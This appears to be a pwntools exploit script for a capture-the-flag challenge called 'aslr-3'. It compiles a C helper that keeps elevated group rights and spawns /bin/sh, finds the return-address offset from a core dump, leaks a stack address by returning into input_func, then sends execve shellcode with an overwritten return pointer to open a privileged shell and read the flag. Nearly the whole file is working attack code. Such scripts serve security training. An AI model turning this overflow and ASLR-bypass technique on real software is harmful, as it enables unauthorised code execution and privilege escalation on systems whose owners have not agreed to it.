from pwn import *
import os

DEBUG = False 
file = "./aslr-3"
env = { "PATH":"$PATH:."} 
elf = ELF(file)

c_code = '''
#include <unistd.h>

int main(){
    setregid(getegid(), getegid());
    execve("/bin/sh", 0, 0);
}
'''

with open("payload.c", "w") as f:
    f.write(c_code)

os.system("gcc -o z payload.c")

io = process(file, env)
io.send(cyclic(1000))
io.wait()
core = io.corefile
max_len = cyclic(0x100).find(p32(core.eip))
print(max_len)
os.unlink(core.path)

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = process(file, env=env)
    gdb.attach(io, gdbscript='''
b input_func
''')
else:
    io = process(file, env=env)


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE
input_func_addr = elf.symbols["input_func"]

shellcode = asm('''
    xor ecx, ecx
    xor edx, edx

    push 0x7a
    mov ebx, esp

    mov eax, 0xb
    int 0x80
''')

ebp_buf_off = 136
stack_addr_ebp_off = 16

stack_addr_buf_off = 0xa8

payload = b"a" * max_len + p32(input_func_addr)
io.sendline(payload)
io.recvline()
io.sendline(f"{ebp_buf_off + stack_addr_ebp_off + 4}".encode('utf8'))

buf_addr = u32(io.recvuntil(b"!")[-5:-1]) - stack_addr_buf_off
print(hex(buf_addr))

print(hex(buf_addr))
payload = shellcode + b"a" * (max_len - len(shellcode)) + p32(buf_addr)
io.sendline(payload)
io.interactive()

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

import re
io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)
